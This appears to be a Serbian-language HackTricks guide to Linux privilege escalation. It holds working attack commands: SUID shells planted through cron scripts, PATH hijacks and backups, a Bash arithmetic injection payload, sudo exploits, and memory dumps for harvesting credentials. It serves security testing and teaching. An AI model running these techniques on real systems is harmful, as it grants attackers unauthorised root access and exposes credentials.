# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o pokrenutom operativnom sistemu
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje na bilo koji direktorijum unutar `PATH`** promenljive, možda ćete moći da preotmete neke biblioteke ili binarne fajlove:
```bash
echo $PATH
```
### Podaci o okruženju

Ima li zanimljivih informacija, lozinki ili API ključeva u varijablama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernel-a i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretraživanju kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenuti IN victim, samo proverava exploits za kernel 2.x)

Uvek **pretražite kernel verziju na Google-u**, možda je vaša kernel verzija navedena u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

Dodatne kernel exploitation tehnike:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju lokalnim neprivilegovanim korisnicima da povećaju svoje privilegije na root preko sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma kojim upravlja korisnik.

Evo [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [ranjivosti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` funkcionalnost.

Za više informacija, pogledajte originalno [obaveštenje o ranjivosti](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo pre 1.9.17p1 (prijavljeni pogođeni opseg: **1.8.8–1.9.17**) može proceniti host-based sudoers rules koristeći **user-supplied hostname** iz `sudo -h <host>` umesto **real hostname**. Ako sudoers dodeljuje šire privilegije na drugom hostu, možete **spoof** taj host lokalno.

Requirements:
- Ranjiva sudo verzija
- sudoers pravila specifična za host (host nije ni trenutni hostname niti `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit pomoću spoofing-a dozvoljenog hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ako rešavanje spoofed name bude blokirano, dodajte ga u `/etc/hosts` ili koristite hostname koji se već pojavljuje u logs/configs da biste izbegli DNS lookups.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifikacija potpisa nije uspela

Proveri **smasher2 box of HTB** za **primer** kako se ova vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojite moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Ako se nalazite unutar container-a, počnite sa sledećim container-security odeljkom, a zatim pivot into the runtime-specific abuse pages:


{{#ref}}
container-security/
{{#endref}}

## Diskovi

Proverite **what is mounted and unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount i proverite osetljive informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Navedite korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je instaliran **bilo koji compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga compile-ujete na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija…\
Preporučuje se ručno proveriti verziju instaliranog softvera za koji postoje sumnje.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, stoga se preporučuje korišćenje aplikacija kao što je OpenVAS ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li postoje [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih otkriva proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati nečiji binarni fajl.

### Lanci roditelj-dete između različitih korisnika

Proces deteta koji se izvršava pod **drugim korisnikom** nego njegov roditelj nije automatski zlonameran, ali predstavlja koristan **triage signal**. Neke tranzicije su očekivane (`root` koji pokreće servisnog korisnika, login managers koji kreiraju session procese), ali neobični lanci mogu otkriti wrappers, debug helpers, persistence, ili slabe granice poverenja tokom runtime-a.

Brzi pregled:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ako pronađete neočekivan lanac, pregledajte roditeljsku komandnu liniju i sve fajlove koji utiču na njegovo ponašanje (`config`, `EnvironmentFile`, helper skripte, radni direktorijum, upisivi argumenti). U nekoliko stvarnih privesc putanja child proces sam po sebi nije bio upisiv, ali je **roditeljski kontrolisan config** ili pomoćni lanac bio upisiv.

### Izbrisani izvršni fajlovi i fajlovi otvoreni nakon brisanja

Runtime artefakti su često i dalje dostupni **nakon brisanja**. Ovo je korisno kako za privilege escalation, tako i za povraćaj dokaza iz procesa koji već ima otvorene osetljive fajlove.

Proverite izbrisane izvršne fajlove:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje izvršava staru binarnu sliku iz memorije. To je snažan signal za istragu jer:

- uklonjeni izvršni fajl može sadržati interesantne stringove ili kredencijale
- pokrenuti proces može i dalje izlagati korisne file descriptors
- obrisani privilegovani binarni fajl može ukazivati na nedavno manipuliranje ili pokušaj čišćenja

Prikupi obrisane, ali otvorene fajlove globalno:
```bash
lsof +L1
```
Ako pronađete zanimljiv descriptor, oporavite ga direktno:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ovo je posebno vredno kada proces i dalje ima otvoren obrisani secret, skript, izvoz baze podataka ili flag fajl.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debugovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing funkcionisao.
> - **kernel.yama.ptrace_scope = 1**: samo parent process može biti debugovan.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može biti praćen putem ptrace. Nakon postavljanja potreban je reboot da bi se ptracing ponovo omogućio.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati PID, maps prikazuju kako je memorija mapirana unutar virtualnog adresnog prostora tog procesa; takođe prikazuju i dozvole svake mapirane regije. Pseudo-fajl mem izlaže samu memoriju procesa. Iz maps fajla znamo koje su memorijske regije čitljive i njihove offset-e. Koristimo ove informacije da se seek-ujemo u mem fajl i dump-ujemo sve čitljive regije u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` obezbeđuje pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Kernel-ov virtuelni adresni prostor može se pristupiti pomoću /dev/kmem.\
Tipično, `/dev/mem` je čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za Linux

ProcDump je Linux verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Dostupan je na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Da biste napravili dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i napraviti dump procesa koji vam pripada
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako primetite da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump-ovati proces (pogledajte prethodne sekcije da pronađete različite načine za dump memorije procesa) i potražiti credentials u memoriji:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Zahteva root privilegije da bi radio ispravno.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Pretraga Regex-ova/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) koji radi kao root – web-bazirani scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i je vezan samo za loopback, i dalje mu možeš pristupiti putem SSH local port-forwardinga i kreirati privilegovani job za eskalaciju.

Tipičan lanac
- Otkrij port dostupan samo sa loopback interfejsa (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađi kredencijale u operativnim artefaktima:
- Backup-ovi/skripte sa `zip -P <password>`
- systemd unit koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i uloguj se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj high-priv job i pokreni odmah (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje
- Ne pokrećite Crontab UI kao root; ograničite ga na posvećenog korisnika i minimalne dozvole
- Vežite na localhost i dodatno ograničite pristup putem firewall-a/VPN; nemojte ponovo koristiti lozinke
- Izbegavajte ugrađivanje tajni u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit i logovanje za izvršavanja poslova na zahtev

Proverite da li je neki zakazani posao ranjiv. Možda možete iskoristiti skript koji se izvršava kao root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ako se koristi `run-parts`, proverite koja imena će se zaista izvršiti:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Ovo sprečava lažne pozitivne rezultate. Upisiv periodični direktorijum je koristan samo ako naziv vašeg payload fajla odgovara lokalnim pravilima `run-parts`.

### Cron path

Na primer, u _/etc/crontab_ možete naći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako u ovom crontabu root pokuša da izvrši neku komandu ili skript bez podešenog PATH-a. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi script sa wildcard-om (Wildcard Injection)

Ako script koji izvršava root sadrži “**\***” unutar komande, možete iskoristiti ovo da izazovete neočekivane stvari (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako wildcard dolazi nakon putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova za iskorišćavanje wildcard-a:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash vrši parameter expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser učitava nepouzdana polja iz log-a i ubacuje ih u arithmetic context, napadač može injektovati command substitution $(...) koji će se izvršiti kao root kada cron pokrene.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da attacker-controlled tekst bude upisan u parsirani log tako da numeričko-polje sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne ispisuje na stdout (ili je preusmerite) tako da arithmetic ostane validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji izvršava root koristi **direktorijum u kojem imate potpuni pristup**, možda bi bilo korisno obrisati taj folder i **napraviti symlink folder koji pokazuje na drugi** koji izvršava script pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validacija symlink-a i bezbednije rukovanje fajlovima

Prilikom pregleda privilegovanih skripti/binarnih fajlova koji čitaju ili pišu fajlove po putanji, proverite kako se rukuje linkovima:

- `stat()` prati symlink i vraća metapodatke ciljnog fajla.
- `lstat()` vraća metapodatke samog linka.
- `readlink -f` i `namei -l` pomažu da se razreši konačni cilj i prikazuju dozvole svakog dela putanje.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Za odbranu i developere, sigurniji obrasci protiv symlink trikova uključuju:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams ponekad "sign" cron-driven binare tako što dumpuju custom ELF sekciju i koriste grep za vendor string pre nego što ih pokrenu kao root. Ako je taj binary group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete leak the signing material, možete falsifikovati sekciju i preuzeti cron task:

1. Koristite `pspy` da snimite tok verifikacije. U Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor` zatim `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potom izvršio fajl.
2. Ponovo kreirajte očekivani sertifikat koristeći the leaked key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Sastavite malicioznu zamenu (npr. drop a SUID bash, dodajte svoj SSH ključ) i embed-ujte sertifikat u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite zakazani binary, pritom zadržavajući execute bitove:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće cron pokretanje; kada naivna provera potpisa uspe, vaš payload će se izvršiti kao root.

### Frequent cron jobs

Možete pratiti procese da biste pronašli procese koji se izvršavaju na svake 1, 2 ili 5 minuta. Možda to možete iskoristiti za eskalaciju privilegija.

Na primer, da biste **monitorovali na svakih 0.1s tokom 1 minuta**, **sortirali po manje izvršenim komandama** i obrisali komande koje su se izvršavale najviše puta, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i navesti svaki proces koji se pokrene).

### Root backupi koji očuvaju mode bitove postavljene od strane napadača (pg_basebackup)

Ako root-owned cron poziva `pg_basebackup` (ili bilo koju rekurzivnu kopiju) nad direktorijumom baze podataka u koji možete pisati, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root** sa istim mode bitovima u izlaz backup-a.

Tipičan tok otkrivanja (kao DB korisnik sa ograničenim privilegijama):
- Koristite `pspy` da uočite root cron koji poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` svake minute.
- Potvrdite da je izvorni klaster (npr., `/var/lib/postgresql/14/main`) upisiv za vas i da destinacija (`/opt/backups/current`) postaje u vlasništvu root nakon posla.

Eksploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Ovo funkcioniše zato što `pg_basebackup` čuva file mode bitove prilikom kopiranja clustera; kada ga pokrene root, odredišne datoteke nasleđuju **root ownership + attacker-chosen SUID/SGID**. Bilo koja slična privilegovana rutina za backup/kopiranje koja zadržava permisije i upisuje u izvršnu lokaciju je ranjiva.

### Nevidljivi cron jobovi

Moguće je kreirati cronjob **stavljanjem carriage return-a posle komentara** (bez newline karaktera), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Da biste otkrili ovu vrstu prikrivenog ulaza, pregledajte cron fajlove pomoću alata koji otkrivaju kontrolne karaktere:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servisi

### _.service_ fajlovi kojima se može pisati

Proverite da li možete da upišete bilo koji `.service` fajl, ako možete, vi **možete da ga izmenite** tako da **izvrši** vaš **backdoor kada** servis bude **pokrenut**, **ponovo pokrenut** ili **zaustavljen** (možda ćete morati da sačekate da se mašina restartuje).\  
Na primer, kreirajte vaš backdoor unutar `.service` fajla sa **`ExecStart=/tmp/script.sh`**

### Binarni fajlovi servisa kojima se može pisati

Imajte na umu da, ako imate **dozvole za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti u backdoor-ove tako da kada se servisi ponovo pokrenu, backdoor-ovi budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **write** u bilo kojem od foldera na tom putu, možda ćete moći da **escalate privileges**. Treba da tražite **relative paths being used on service configurations** u datotekama kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **executable** sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH direktorijuma u koji možete da pišete, i kada se servisu zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da startuju/stopuju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije se ime završava sa `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje po kalendarskom vremenu i monotonička vremena i mogu se pokretati asinhrono.

Možete izlistati sve timers pomoću:
```bash
systemctl list-timers --all
```
### Upisivi timeri

Ako možete izmeniti timer, možete ga naterati da izvrši neku postojeću systemd.unit jedinicu (npr. `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na servis koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identična, osim sufiksa.

Dakle, da biste zloupotrebili ovu privilegiju potrebno je da:

- Pronađete neku systemd jedinicu (npr. `.service`) koja izvršava binarni fajl kojem imate prava pisanja
- Pronađete systemd jedinicu koja izvršava relativnu putanju i nad kojom imate writable privilegije nad systemd PATH (da biste lažirali taj izvršni fajl)

**Saznajte više o timerima sa `man systemd.timer`.**

### **Omogućavanje timera**

Da biste omogućili timer, potrebno je root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Obratite pažnju da se **timer** **aktivira** kreiranjem symlinka ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Socketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istoj ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i konfigurišu se preko `.socket` fajlova.

Socketi se mogu konfigurisati pomoću `.socket` fajlova.

**Više o socketima pročitajte u `man systemd.socket`.** Unutar ovog fajla može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali ukratko služe da **naznače gde će socket osluškivati** (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta koji će se osluškivati, itd.)
